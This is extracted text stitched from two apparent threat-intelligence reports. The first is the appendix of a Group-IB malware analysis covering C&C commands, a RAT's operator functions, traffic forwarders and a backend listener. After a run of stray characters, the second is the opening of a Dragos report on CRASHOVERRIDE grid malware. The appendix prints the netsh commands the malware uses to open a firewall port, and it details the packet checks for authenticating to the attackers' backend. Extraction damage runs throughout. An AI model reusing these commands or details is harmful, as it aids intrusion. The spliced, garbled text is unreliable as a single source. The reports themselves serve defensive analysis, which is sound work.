\nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 34\nSome constants from the libgcrypt library are presented below:\nAfter decoding arguments (the arguments that were passed to the second \nstage module), the payload gets an IP address and a port of the C&C server. \n\nThe payload communicates with the C&C server using a speci\u02dac encryption \n\nprotocol at the application level. \n 35\nIf the remote host is speci\u02daed, then the connection is performed to this node. \nAs has been mentioned, the sample body contains several Russian words in \n\ntransliteration:\n\"Nachalo\" is a debugging string that will be sent in encrypted format to the \nC&C server, indicating that a connection to the target node is established. \n\nWhen executing a thread, 5 attempts are made to connect to the C&C server \n\ndirectly. The program will shut down if the connection fails. In the event the \n\nconnection is successful, the application receives commands from the C&C \n\nserver and executes them. All commands and server responses are encrypted \n\nby default, but for your convenience, they are listed below in decrypted form.\nThe main purpose of connecting to the C&C server is to receive (or send) \nencrypted content from the server to the target machine. The connection \n\nto the C&C server is performed to the network address and port that are \n\nspeci\u02daed as command-line arguments when the sample is launched (by \n\nLoader).\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 36\nBelow is a list of available commands: \nBy sending the \"ssylka\" message to the C&C server, the analyzed \u02dale can \nmake the C&C server keep the connection open for further tra\u02dbc redirection \n\nbetween the C&C server and Layer 1. The \"ssylka\" command is executed \n\nin the event the \"pereslat\" command is received from the C&C server. This \n\nmeans that the C&C server initiates the communication session by sending the \n\n\u00abpereslat\u00bb command and waits for the incoming connection from the program \n\n(with the \"ssylka\" message) to further forward tra\u02dbc between the C&C server \n\nand Layer 1 (communications are possible in both directions). The sample \n\ndoes not have a list of commands to forward tra\u02dbc between the C&C server \n\nand Server2, it just redirects data from the one socket to another, when two \n\nconnections are active.\nOne of the commands that can be received from the C&C server is \n\u00abustanavlivat\u00bb. In the event the program receives it, it performs an additional \n\nrequest to the C&C server and receives a network address of the Server2 \n\nnode, which will be further used as an end point to proxy network tra\u02dbc. \nThe \"kliyent2podklyuchit\" message is intended to check the e\u02dbciency \nof an intermediate proxy server, through which network connections \n\nwill be performed. If the target computer is speci\u02daed in the command \n\nline, the sample will connect to this host with an additional message \n\n\"kliyent2podklyuchit\". The connection is performed using the functionality of \n\nthe statically linked library \ufb01libcurl\ufb02. In the event the connection is successful, \n\ntra\u02dbc from the C&C server will further go through the proxy. If not, the \n\napplication terminates its operation.\nCommand\nDescription\nustanavlivat\nto receive a network address \nof the active Server2 server \nfrom the C&C server (the \naddress will be sent in the next \n\npackage)\npoluchit\nto send a network address of \nthe current Layer 2 server to \nthe C&C server\npereslat\nto forward data between the \nC&C server and Server2\nderzhat\nto keep the connection open\nvykhodit\nto terminate the session\nCommand\nDescription\nNachalo\nThis message sent to the C&C \nserver or the proxy during \nthe start of the sample is the \nstart-up indicator\nkliyent2podklyuchit\na testing proxy performance \n\npackage\nssylka\nto connect to the \u02db&C server \nto forward tra\u02dcc between the \nC&C server and Server2\nvykhodit\nnotifying the C&C server of \nsession termination\nCommands from the C&C server \nMessages to the C&C server\n 37\nThe C&C server also may send the \"poluchit\" command. Once this command \nis received, the analyzed \u02dale will send a network address of the current server \n\nServer2 to the C&C server. \nThe next possible command from the C&C server is \"pereslat\". Once this \ncommand is received, the \u02dale requests data from the C&C server and receives \n\na certain X number. Following this, the sample will execute a multi-threaded \n\nC&C request with the \"ssylka\" command and forward tra\u02dbc between the \n\nC&C server and Server2 nodes, when necessary. The number of threads for \n\ntra\u02dbc redirection is equal to the X number that was previously obtained from \n\nthe C&C server. If X> 1, then more than one equivalent tunnel is established \n\nsimultaneously to redirect tra\u02dbc from the C&C server to Server2 (the \"ssylka\" \n\ncommand).\n\"On top\" of the application protocol with encryption, application tra\u02dbc is \nwrapped up inside ordinary TLS. \"Visible\" network tra\u02dbc is a simple TLS \n\nconnection.\n \n16 xx xx xx xx yy 00 xx xx xx xx [32 rnd bytes] 00 00 1C C0 13 C0 14 C0 27 C0 2F \n\n00 9E 00 6B 00 67 00 39 00 33 00 9C 00 3D 00 3C 00 35 00 2F 01 00 xx xx 00 \n\n0A 00 08 00 06 xx xx xx xx xx xx\n16 xx xx xx xx yy 00 xx xx xx xx [32 rnd bytes] 00 00 0E C0 13 C0 14 00 39 00 39 \n00 33 00 35 00 2F 01 00\n16 xx xx xx xx yy 00 xx xx xx xx [32 rnd bytes] 00 00 xx 00 00 05 FF 01 00 01 00\nServer_RAT\nThe ejbss.dll library (MD5: 570e6ea21cdce694a4a74876ca87534a, size: \n226304 bytes) is classi\u02daed as Server_RAT. \nDescription\nThe \u02dale is a resident RAT application that, once launched, waits for \nincoming connections on a speci\u02dac port to control the infected PC. The \n\nfunctions available for a remote operator include launching arbitrary \n\ncommands, collecting data about the system, active PC sessions and \n\nrunning processes, deleting arbitrary \u02dales, reading data from the \u02dale, \n\ndownloading and executing \u02dales.\nThe program is installed as a service (purportedly using Dropper) and \nextracts the payload from itself. The scheme is similar to that that is used \n\nto infect client (target) machines.\nThrough examination of infected proxies, Group-IB specialists identi\u02daed a \nservice called rpcapt and a path to the program %WINDIR%\\ejbss.dll.\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 38\nAfter startup, Payload is extracted and decrypted\n 39\nThe decrypted file is also a dynamic library containing a payload. \nAfter decryption, the file looks for exported funtion with ordinal #1 \n\nand calls it. \n \n\u0141\n \nOn \u02darst run the application checks for the \"mbcrs.rll\" \u02dale in the OS \nsystem directory. In the event the \u02dale exists, the app decrypts it and \n\nreads a port number from the \u02dale. This number will then be used \n\nfor network communications. If the \u02dale does not exist, it is created \n\nand the port number generated in random fashion is added there in \n\nencrypted form. It is worth noting that Group-IB specialists always \n\nobserved port 3365 on the proxy.\n\u0141\n \nThe \u02dale can use a port precon\u02dagured by the attacker (and not a port \n\nwith a random number), if the \"mbcrs.rll\" \u02dale was copied with it during \n\nthe RAT installation.\n\u0141\n \nFor the network port that will be used for network communications, \n\nan rule is generated for the OS \u02darewall. This action is performed by \n\nrunning one of the following commands:\nnetsh adv\u02darewall \u02darewall add rule name=CoreNetworkingHTTPS \n\ndir=in action=allow Protocol=TCP localport=%d\nnetsh \u02darewall add portopening protocol=tcp port=%d \nname=CoreNetworkingHTTPS\nwhere %d \u0152 the above-mentioned port number\n\u0141\n \nwaits for incoming connections from the operator on the port, \nmentioned in the point above\n\u0141\n \ncan execute commands as required by the operator\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 40\n 41\n\u0141\n \nThe table below contains a list of all commands available:\nCommand\nDescription\nOF\nCollects and sends the following system data to the operator: OS version, \nprocessor, computer name, information about network interfaces, information \n\nabout mounted disks\nOG\nEnumerates and sends data about existing disks in the system\nOH\nChecks for certain \u02dales on the disk\nOR\nChanges the current working directory\nOI\nEnumerates and sends running processes\nOJ\nTerminates the process with a speci\u02dac name\nOM\nRuns the command / \u02dale\nON\nDeletes a speci\u02dac \u02dale\nOO\nWrites data to a speci\u02dac \u02dale\nOP\nSets the timestamps to a speci\u02dac \u02dale that are the same as those of the system \n\n\u02dale shell32.dll \nOQ\nExecutes the command and send its output\nOU\nCreate a \u02dale with speci\u02daed content and set the \u02dale timestamp that is the same \n\nas the timestamp of shell32.dll\nOT\nReads the \u02dale contents and sends it to the operator\nOS\nSearches for the speci\u02daed \u02dale or directory, reads its contents and sends it to \n\nthe operator\nOV\nGets and sends disk information\nOW\nModi\u02daes the \u02dale\u2122s timestamp\nOE\nConnect to a speci\u02dac network node for tra\u02dcc transmission\nOX\nReads, decrypts, and sends data from a \u02dale of the form \ufb01%windir%\\system32\\\n\nhyrX.dll\ufb02 in the system directory (where X is an arbitrary substring), \n\npurportedly containing the bot con\u02daguration\nOY\nWrites data to a \u02dale in the system directory\nOZ\nGathers data about active sessions\nO\u02db\nSends the \"0d\" command to the operator\nOK\nSends the \"0a\" command to the operator\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 42\nServer_Tra\u02dccForwarder\nThe msvmgr.exe (MD5: 3c3982d068bc7f2d1e4742c2009b0f46, size: \n180224 bytes) and msdtc.exe (MD5: b603a16a950056df336fe3950c816\n\n01d, size: 348160 bytes, MD5: d032aeb54cf1229e011c070ecd64c33, size: \n\n315904 bytes) executable programs are Server_ Tra\u02dbcForwarder.\nOn infected proxies, these programs always were child processes of \nServer_RAT and were located in %windows%.\nDescription\nThe \u02dale is a resident application that, once launched, waits for incoming \nconnections on a speci\u02dac port to provide further control of the PC to the \n\nattacker.\nServer_Tra\u02dbcForwarder uses the wolfSSL staticly linked library to \nimplement asymmetric encryption of tra\u02dbc between the client and the \n\nserver.\n 43\nKeys\nIt has two related \u02dales:\n\nThe \ufb01wcer.dat\ufb02 \u02dale (size: 4382 bytes, md5: E39C8A1B2D35EC1B7BF73599\nEA4A33FA) is a certi\u02dacate \u02dale:\nThe \ufb01wkey.dat\ufb02 \u02dale (size: 1675 bytes, md5: F329B8A6957635C8CCA1C97\nFA459DC82) is a private key \u02dale\nThe related \u02dales are used to encrypt network tra\u02dbc and verify the client.\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 44\nInformation about the C&C server or addresses of clients is not available \nin the \u02dale. The sample just waits for incoming connections to the selected \n\nport. \nMain functionality\n\u0141\n \nParses the command line arguments\n \nExample: \"msvmgr.exe 4444 111.222.111.222 31337\"\n \nThe sample must be run with the following arguments:\nmsvmgr.exe port ip1 port2\n\nwhere port is a port used to wait for incoming connections\n\nip1 - an IP address of Layer 2 server to which it is required to connect\n\nport2 \u0152 a port of the Layer 2 server, to which it is required to connect to redirect \ntra\u02dbc\nBased on the above-mentioned information, in the event the second command \nline argument (IP address) is speci\u02daed, then after establishing connection with the \n\nclient, the sample will connect to the network node from the second argument \n(for the above-mentioned example this will be \"111.222.111.222\") to the port from \nthe third argument (31337 in the example). This server will be used to proxy tra\u02dbc \nfrom the client. If the command-line arguments are not speci\u02daed, the remote \n\nclient will accept incoming connections, but will not tunnel the tra\u02dbc, because it \n\nwill not be able to establish an outgoing connection with the next node (it is not \nspeci\u02daed) and run two threads to redirect tra\u02dbc.\n \n\u0141\n \nAfter the start, it reads the contents of the key and certi\u02dacate \u02dale \nfrom the current directory.\n\u0141\n \nIt binds the port from the arguments; if the arguments do not \n\ncontain a port \u0160 it listens on a random port and waits for incoming \n\nconnections\nSupported functionality:\n\u0141\n \nperforms network communications over an encrypted protocol\n\u0141\n \nself-removal\n\u0141\n \nreads and sends system information: about PC components, locales, \nfree space on disks, RAM size, network adapters and local interfaces, \n\nOS version, Windows version identi\u02daer, PC name\n 45\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 46\n\u0141\n \ncan read and send the contents of the private key \u02dale\n\u0141\n \nchecks the validity of client\u2122s responses (checking if this is a legitimate \nclient). After \u02darst network request program gets the response from the \n\nclient, decrypts and compares it with a previously known response. In the \n\nevent he gets a different response - it drops the connection.\nBelow is the table of all available commands:\nTable 1\nCommand\nDescription\n0x1095\n-\n0x1096\nCollects and sends system information\n0x10AA\nGets the con\u02daguration\n0x10AB\nChanges the con\u02daguration (including the port on which it listens for \nconnections)\n0x10AE\n-\n0x10AF\n-\n0x10B3\nReads a private key \u02dale and sends it to the operator\n0x10B4\nWrites data to a \u02dale\n 47\nGroup-IB specialists have detected several versions of the \u02dale. They differ in \nthe list of available commands. Another version of the malicious \u02dale has the \n\nfollowing command list:\nTable 2 \nBackend_Listener\nAn executable \u02dale \ufb01msdtc.exe\ufb02 (MD5: 5C1917F6753D03A08328132DB1E06571, \nsize: 257 536 bytes) can be classi\u02daed as Backend_Listener.\nIt is a service application waiting for incoming connections on two ports. It \ncan redirect tra\u02dbc from one port to another, thereby implementing a tunnel \n\nbetween the client connected to the second port and the client connected to \n\nthe \u02darst one and vise versa.\nDescription\nOnce launched, the application extracts two arguments from the command \nline. These are port numbers on which the application will wait for incoming \n\nconnections.\nCommand\nDescription\nNONE\n-\nGINF\nCollects and sends system information about the PC\nGCFG\nGets con\u02daguration\nSCFG\nChanges the con\u02daguration (including the port on which it listens connections)\nSLEP\n-\nHIBN\n-\nLCLR\nRecords data to the \u02dale\nLDWN\nReads a private key \u02dale and sends it to the operator\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 48\nTo encrypt tra\u02dbc, an open source library named wolfSSL is used. After the \napplication is started, the private key and certi\u02dacate \u02dales will be extracted \n\nfrom the current directory. They are used to encrypt tra\u02dbc between the \n\nserver and connected clients that must have identical key pairs. Without them, \n\nyou can not connect to the service, or decrypt its tra\u02dbc.\nThe program opens two ports and waits for incoming connections from \nthe operator on one of them. The \u02darst port is port1 from the command-line \n\narguments. Port2 is the second argument. In our study, the \u02darst port was port \n\n8080, the second one was port 9090.\n 49\nIn order to trigger tra\u02dbc from one port to another, the operator performs \na connection to the server (server is the current sample, because it is just a \n\nservice waiting for incoming connections) on port2 (9090).\nOnly an operator can connect to the server to control tra\u02dbc because the \nservice uses a private and public key pair to authorize and encrypt tra\u02dbc (and \n\nthis key pair must be identical to the one that the client-operator will use). In \n\nthe event of absence of a key pair, or with a different pair of keys, the service \n\nwill drop connections.\nTo establish a successful connection, several checks will be performed. In \naddition, tra\u02dbc is encrypted with a reversible algorithm.\nResponse data from the server is partially randomized. Probably, this \nis intended to randomize the length of outgoing packets, so that tra\u02dbc \n\ngenerated by the server alters, which complicates its detection.\nIf all the legitimacy tests of the operator\u2122s commands are passed, two tra\u02dbc \nthreads from one port to another will be triggered.\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 50\nFollowing this, when the client connects to the \u02darst port (8080), the service \nwill forward tra\u02dbc from the \u02darst port to the second one and back.\nIf there are no active connections on the \u02darst port, the server issues the \n\"PELS\" command to the client connected to the second port.\nTo reverse-engineer the protocol of server communications with \nconnected clients, Group-IB specialists have developed a client that \n\nsuccessfully connects to both ports of the server. Its code was created \n\nbased on the server\u2122s requests and responses as well as using the open \n\nsource library wolfSSL.\n 51\nTo connect to the server in order to tunnel tra\u02dac, the operator should use \nAdmin_Tool designed to control the infrastructure:\n1.\n \nAdmin_Tool must have a key pair identical to the server\n2.\n \nIt sends a customized Hello-packet that differs from the one that is \nprovided by the library. \n \n\n \nBy default this packet (msg) is speci\u02daed as follows in the library:\n \n\n \n \nThe correct Hello packet that will be accepted by Backend_Listener must be of the \nfollowing form:\n \n\nIn fact, this is an information packet, rather than a Hello packet, and its \u02darst \n\nbyte contains the length of the next packet sent (\u00ablen\u00bb), while the rest bytes \n\nmust be zero in this case.\n \n3.   \n \nAdmin_Tool sends an encrypted (special) packet with a length from the \nprevious packet (len).\n4.  \n \nThe server decrypts the contents of the packet sent and, after decryption, \n\nthe following conditions must be true:\n \n(DWORD)&decrypted_buff[5] == len\n(DWORD)&decrypted_buff[15] == len \n\nwhere len is the length of the packet\n\n \n5.   \n \nAdmin_Tool sends DWORD with len2 < 201 where len2 is the length of the \nnext packet\n \n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 52\n6.   \n \nAdmin_Tool sends the encrypted (special) second packet with the length \nreceived in the previous packet\n \n7.   \n \nThe server decrypts the contents of the packet sent, and after decryption, \n\nthe following conditions must be true:\n \n(DWORD)&decrypted_buff[4] == 0xD1CC8594\n(DWORD)&decrypted_buff[8] == 3\n 53\nPreventing \n \nand investigating \n\ncybercrime since 2003\nwww.group-ib.com\nblog.group-ib.com\ninfo@group-ib.com\n\n+7 495 984 33 64\ntwitter.com/groupib_gib\n\nlinkedin.com/company/group-ib\n ", "             F\n\u00fa\nH\n\ufb02\n0\n\u2021\n\u00f6\u00f6\ufb02\u00fa\nH\n\u00fb\u00fb\u00fb\n\u00b3\u00b3\n\u2021\u2021\n\u00d1\nl\n\u00b3\u00e2\ufb02\n\u00d2\n    ", "CRASHOVERRIDE\nAnalysis of the Threat\nto Electric Grid Operations\nDRAGOS INC. / \nWWW.DRAGOS.COM\nversion 2.20170613\n 2\nContents\nExecutive Summary\n       \n3\n    Why Are We Publishing This\n     \n3\n    Key Takeaways\n       \n4\nBackground\n        \n5\n    Introduction to Electric Grid Operations\n   \n6\nEvolution of Tradecraft\n      \n8\n    STUXNET\n        \n8\n    Dragon\u02dcy/HAVEX\n      \n9\n    BLACKENERGY 2\n       \n10\n    Ukraine Cyber Attack 2015\n     \n10\n    CRASHOVERRIDE\n      \n11\nCapabilities\n        \n12\n    Capabilities Overview\n      \n12\n    Module Commonalities\n      \n13\n    Backdoor/RAT Module\n      \n13\n    Launcher Module\n      \n15\n    Data Wiper Module\n      \n16\n    IEC 104 Module\n       \n17\n    IEC 101 Module\n       \n21\n    61850 Module\n       \n21\n    OPC DA Module\n       \n21\n    SIPROTECT DoS Module\n     \n22\n    Capability Conclusions\n      \n22\nImplications of capability\n      \n22\n    Attack Option: De-energize substation\n   \n22\n    Attack Option: Force an Islanding event\n   \n23\n    Adding Ampli\u02dacation Attacks\n     \n24\n    Using OPC to create a Denial of Visibility\n   \n24\n    Using CVE-2015-5374 to hamper protective relays\n  \n25\nDefense Recommendations\n     \n26\nCRASHOVERRIDE\n \nAnalyzing the Threat to \nElectric Grid Operations\n 3\nWhy Are We Publishing This\nSecurity \u02darms must always balance a need to inform the public against empowering \nadversaries with feedback on how they are being detected and analyzed. This case is \nno di\u02dberent. In fact, it is more important given that there is no simple \u02dax as the capa\n-\nbility described in this report takes advantage of the knowledge of electric grid sys\n-\ntems. It is not an aspect of technical vulnerability and exploitation. It cannot just be \npatched or architected away although the electric grid is entirely defensible. Human \ndefenders leveraging an active defense such as hunting and responding internally to \nthe industrial control system (ICS) networks can ensure that security is maintained.\nExecutive Summary\nDragos, Inc. was noti\u02daed by the Slovak anti-virus \u02darm ESET of an ICS tailored mal\n-\nware on June 8th, 2017. The Dragos team was able to use this noti\u02dacation to \u02dand \nsamples of the malware, identify new functionality and impact scenarios, and con\n-\n\u02darm that this was the malware employed in the December 17th, 2016 cyber-attack \non the Kiev, Ukraine transmission substation which resulted in electric grid opera\n-\ntions impact. This report serves as an industry report to inform the electric sector \nand security community of the potential implications of this malware and the appro\n-\npriate details to have a nuanced discussion. \n 4\nKey Takeaways\n\u0141\n \nThe malware self-identi\u02daes as \ufb01crash\ufb02 in multiple locations thus leading to the \nnaming convention \ufb01CRASHOVERRIDE\ufb02 for the malware framework.\n\u0141\n \nCRASHOVERRIDE is the \u02darst ever malware framework designed and deployed to \nattack electric grids.\n\u0141\n \nCRASHOVERRIDE is the fourth ever piece of ICS-tailored malware (STUXNET, \nBLACKENERGY 2, and HAVEX were the \u02darst three) used against targets and the \nsecond ever to be designed and deployed for disrupting physical industrial pro\n-\ncesses (STUXNET was the \u02darst).\n\u0141\n \nCRASHOVERRIDE is not unique to any particular vendor or con\u02daguration and \ninstead leverages knowledge of grid operations and network communications \nto cause impact; in that way, it can be immediately re-purposed in Europe and \nportions of the Middle East and Asia.\n\u0141\n \nCRASHOVERRIDE is extensible and with a small amount of tailoring such as the \ninclusion of a DNP3 protocol stack would also be e\u02dbective in the North Ameri\n-\ncan grid.\n\u0141\n \nCRASHOVERRIDE could be leveraged at multiple sites simultaneously, but the \nscenario is not cataclysmic and would result in hours, potentially a few days, of \noutages, not weeks or more.\n\u0141\n \nDragos assesses with high con\u02dadence that the same malware was used in the \ncyber-attack to de-energize a transmission substation on December 17, 2016, \nresulting in outages for an unspeci\u02daed number of customers.\n\u0141\n \nThe functionality in the CRASHOVERRIDE framework serves no espionage pur\n-\npose and the only real feature of the malware is for attacks which would lead to \nelectric outages.\n\u0141\n \nCRASHOVERRIDE could be extended to other industries with additional pro\n-\ntocol modules, but the adversaries have not demonstrated the knowledge of \nother physical industrial processes to be able to make that assessment anything \nother than a hypothetical at this point and protocol changes alone would be \ninsu\u02ddcient.\n\u0141\n \nDragos, Inc. tracks the adversary group behind CRASHOVERRIDE as ELECTRUM \nand assesses with high con\u02dadence through con\u02dadential sources that ELECTRUM \nhas direct ties to the Sandworm team. Our intelligence ICS WorldView cus\n-\ntomers have received a comprehensive report and this industry report will not \nget into sensitive technical details but instead focus on information needed for \ndefense and impact awareness.\n 5\nBackground\nOn June 8th, 2017 the Slovak anti-virus \u02darm ESET shared a subset of digital hash\n-\nes of the malware described below and a portion of their analysis with Dragos. \nThe Dragos team was asked to validate ESET\u2122s \u02dandings to news publications ESET \nhad contacted about the story which would be published June 12th, 2017. Dragos \nwould like to thank ESET for sharing the digital hashes which allowed the Dragos \nteam to spawn its investigation. Without control of the timeline, it was Dragos\u2122 \ndesire to publish a report alongside ESET\u2122s report to capture the nuance of elec\n-\ntric grid operations. The report also contains new discoveries, indicators, and im\n-\nplications of the tradecraft. Also, because of the connection to the activity group \nDragos tracks as ELECTRUM, it was our decision that an independent report was \nwarranted. The Dragos team has been busy over the last 96 hours reproducing and \nverifying ESET\u2122s analysis, hunting for new samples of the malware and potential ad\n-\nditional infections, notifying appropriate companies, and informing our customers. \nImportantly, Dragos also updated ICS vendors that needed to be made aware of \nthis capability, relevant government agencies, many national computer emergen\n-\ncy response teams (CERTs), and key players in the electric energy community. Our \nmany thanks to those involved.\nIf you are a Dragos, Inc. customer, you will have already received the more concise \nand technically in-depth intelligence report. It will be accompanied by follow-on \nreports, and the Dragos team will keep you up-to-date as things evolve. It is in \nDragos\u2122 view that the following report contains signi\u02dacant assessments that de\n-\nserve a wide audience in the electric sector. Avoiding hype and fear should always \nbe paramount but this case-study is of immediate signi\u02dacance, and this is not a \nsingular contained event. The CRASHOVERRIDE capability is purpose built to im\n-\npact electric grid operations and has been created as a framework to facilitate the \nimpact of electric grids in other countries in the future outside the attack that took \nplace with it December 17th, 2016 in Ukraine. However, as always, the defense is \ndoable.\n 6\nIntroduction to Electric Grid Operations\n \nAs with most ICS speci\u02dac incidents, the most interesting components of the attack \nare in how the adversary has demonstrated they understand the physical industri\n-\nal process. Whereas vulnerabilities, exploits, and infection vectors can drive dis\n-\ncussions in intrusion analysis of IT security threats that is not the most important \naspect of an ICS attack. To fully understand the CRASHOVERRIDE framework, its \nindividual capabilities, and overall impact on ICS security it is important to under\n-\nstand certain fundamentals of electric grid operations.\nSimplistically, the electric grid can be categorized into three functions: generation \nof electricity at power plants, transmission from the power plants across typically \nlong distances at high voltage, and then stepped down to lower voltage to distribu\n-\ntion networks to power customers. Along these long transmission and distribution \nsystems are substations to transform voltage levels, serve as switching stations and \nfeeders, and fault protection.\nMany industries feed into the electric grid, and those di\u02dberences require di\u02dberent \nsystems and communications. As an example, while a power plant feeds energy \ninto the electric grid there is no one-size-\u02dats-all approach to power plants. There \nare power plants that cover di\u02dberent sources of fuel including coal-\u02dared, nuclear \ngeneration, wind farm, solar farm, gas turbine power, hydroelectric and more. This \nmeans that the electric grid must be a robust, almost living creature, which moves \nand balances electricity across large regions. Electric grids use a special type of \nindustrial control system called a supervisory control and data acquisition (SCADA) \nsystem to manage this process across large geographical areas. Transmission and \ndistribution owners have their substations in their particular geographical footprint \nand control centers manage the cross-territory SCADA systems 24/7 by human op\n-\nerators. These control centers often regularly manage the continual demand and \nresponse of their customers, respond to faults, and plan and work with neighboring \nutilities.\nThis simplistic view of grid operations is similar around the world. There are of\n-\nten vendor and network protocol di\u02dberences between countries but the electrical \nengineering, and the overall process is largely the same between nations. As an \nexample, these systems use SCADA and leverage systems such as remote terminal \nunits (RTUs) to control circuit breakers. As the breakers open and close, substations \nare energized or de-energized to balance power across the grid. Some network \nprotocols such as IEC 104, a TCP-based protocol, and its serial protocol compan\n-\nion IEC 101, are often regional speci\u02dac. Europe, some of Asian, and portions of \nthe Middle East leverage these protocols to control RTUs from the SCADA human \nmachine interfaces (HMIs).\n 7\nFigure 1: Simplistic Mockup of Electric Grid Operations Systems and Communications Relevant for CRASHOVERRIDE\nIn North America, the protocol of choice for this is the Distributed Network Proto\n-\ncol 3 (DNP3). The various protocols purposes are largely the same though: control \nphysical equipment through RTUs, programmable logic controllers (PLCs), and \nother \u02danal control elements via HMIs as a part of the larger SCADA system. Some \nprotocols have been adopted cross-country including IEC 61850 which is usual\n-\nly leveraged from an HMI to work with equipment such as digital relays and other \ntypes of intelligent electronic devices (IEDs). IEDs are purpose built microproces\n-\nsor-based control devices and can often be found alongside power equipment \nsuch as circuit breakers. IEDs and RTUs operate in a master/slave capacity where \nthe slave devices are polled and sent commands by master devices.\n 8\nSubstations manage the \u02dcow of power through transmission or distribution lines. \nManagement of energizing and de-energizing of these lines ultimately control \nwhen and where the \u02dcow of power moves in and out of the substation. If you \n\ufb01open\ufb02 a breaker you are removing the path where the electricity is \u02dcowing, or \nde-energizing it. If you \ufb01close\ufb02 a breaker then you are energizing the line by closing \nthe gap and allowing the power to \ufb01\u02dcow.\ufb02 This concept is similar to anyone who \nhas tripped (opened) a breaker in their house. Traditional \ufb01IT\ufb02 or \ufb01IT security\ufb02 sta\u02db \nmay be confused on this terminology as it is opposite to how one would describe \n\u02darewall rules where \ufb01open\ufb02 means network tra\u02ddc may \u02dcow and \ufb01closed\ufb02 means \nnetwork tra\u02ddc is prohibited.\nThe grid is a well-designed system, and while damage can be done, it is vital to un\n-\nderstand that in nations around the world the electric community has designed the \nsystem to be reliable and safe which has a natural byproduct of increased securi\n-\nty. In the United States as an example, reliability is reinforced with regular training \nand events such as the North American grid\u2122s GridEx where grid operators train for \nevents from hurricanes, to terrorist incidents, to cyber-attacks and how they will \nrespond to such outages. There is constantly a balance that must be understood \nwhen referring to grid operations: yes, the systems are vulnerable and more must \nbe done to understand complex and multi-stage attacks, but the grid is also in a \ngreat defensible position because of the work of so many over the years.\nEvolution of Tradecraft\nCRASHOVERRIDE represents an evolution in tradecraft and capabilities by ad\n-\nversaries who wish to do harm to industrial environments. To fully appreciate the \nmalware it is valuable to compare it to its predecessors and the Ukraine 2015 cyber \nattack.\nSTUXNET\nThe STUXNET malware has been written about extensively and referenced, at \ntimes, unfortunately, in comparison to most ICS related incidents and malware. It \nwas the \u02darst con\u02darmed example of ICS tailored malware leveraged against a tar\n-\nget. The Windows portion of the code with its four zero-day exploits gained a lot \nof notoriety. However, it was the malware\u2122s payload that was speci\u02dac to ICS that \nwas the most interesting component. The tradecraft exhibited by STUXNET was \nthe detailed understanding of the industrial process. In IT networks, it is important \nfor adversaries to identify vulnerabilities and exploit them to load malware and gain \nprivileges on systems. \n 9\nIn ICS networks though, some of the most concerning issues are related to an \nadversary\u2122s ability to learn the physical process such as the engineering of the \nsystems and their components in how they work together. STUXNET\u2122s greatest \nstrength was leveraging functionality in Siemens equipment to interact with nucle\n-\nar enrichment centrifuges through abuses of intended functionality. The purpose \nof the Siemens equipment was to be able to control and change the speed of the \ncentrifuges. Stuxnet did this as well but with pre-programmed knowledge from the \nattackers on the speeds that would cause the centrifuge to burst from their cas\n-\nings. ICS tailored malware leveraging knowledge of industrial processes was now a \nthing. However, it was speci\u02dac to Siemens equipment and unique to the Natanz fa\n-\ncility in Iran. While tradecraft and exploits can be replicated, it was not reasonable \nto re-purpose the Stuxnet capability.\nDragonfly/HAVEX\nThe Dragon\u02dcy campaign was an espionage e\u02dbort that targeted numerous industrial \ncontrol system locations, estimates put it at over 2,000 sites, with a large empha\n-\nsis on electric power and petrochemical asset owners. The Dragon\u02dcy campaign \nleveraged the HAVEX malware. There are often not many commonalities between \ndi\u02dberent industrial sites. Even a single substation in one company can be almost \nentirely di\u02dberent than a substation in the same company based on vendors, imple\n-\nmentation, integration, and the physical processes required at each site. One of the \nfew commonalities across numerous ICS industries though is the OPC protocol. \nIt is designed to be the universal translator for many industrial components and is \nreadily accessible in an HMI or dedicated OPC server. The HAVEX malware lever\n-\naged legitimate functionality in the OPC protocol to map out the industrial equip\n-\nment and devices on an ICS network. It was a clever use of the protocol and while \nthe malware itself was not complex the tradecraft associated with the usage of \nOPC was sophisticated. However, the Dragon\u02dcy campaign was focused entirely on \nespionage. There was no physical disruption or destruction of the industrial pro\n-\ncess. Instead, it was the type of data you would want to leverage to design attacks \nin the future built for the speci\u02dac targets impacted with the malware.\n 10\nBLACKENERGY 2\nThe Sandworm team has targeted numerous industries ranging from western mil\n-\nitaries, governments, research organizations, defense contractors, and industrial \nsites. It was their use of the BLACKENERGY 2 malware that caught the ICS indus\n-\ntry\u2122s attention. This ICS tailored malware contained exploits for speci\u02dac types of \nHMI applications including Siemens SIMATIC, GE CIMPLICITY, and Advantech We\n-\nbAccess. BLACKENERGY 2 was a smart approach by the adversaries to target in\n-\nternet connected HMIs. Upon exploitation of the HMIs, the adversaries had access \nto a central location in the ICS to start to learn the industrial process and gain the 